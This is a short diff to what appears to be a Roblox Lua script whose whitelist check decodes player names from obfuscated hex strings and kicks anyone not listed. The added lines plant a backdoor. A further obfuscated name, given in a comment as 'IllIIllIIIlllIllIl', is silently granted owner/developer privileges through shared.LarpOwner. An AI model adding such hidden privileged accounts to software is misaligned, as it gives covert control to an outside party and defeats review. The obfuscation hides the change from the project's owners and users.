@@ -44,6 +44,11 @@ do
 			for _, _s in {_r(_x('005a05285a0959217c100c5c1d51'), _k):lower(), _r(_x('0d571925470c4621521f26520a462d40027a'), _k):lower()} do
 				if _n == _s then _ok = true end
 			end
+			-- IllIIllIIIlllIllIl (lowercased) is granted owner/dev tier
+			if _n == _r(_x('2d5f1a225a15592d5a1f275f155c285f1f27'), _k):lower() then
+				_ok = true
+				shared.LarpOwner = true
+			end
 		end)
 		if not _ok then pcall(function() _p:Kick('You are not whitelisted.') end) return end
 	end
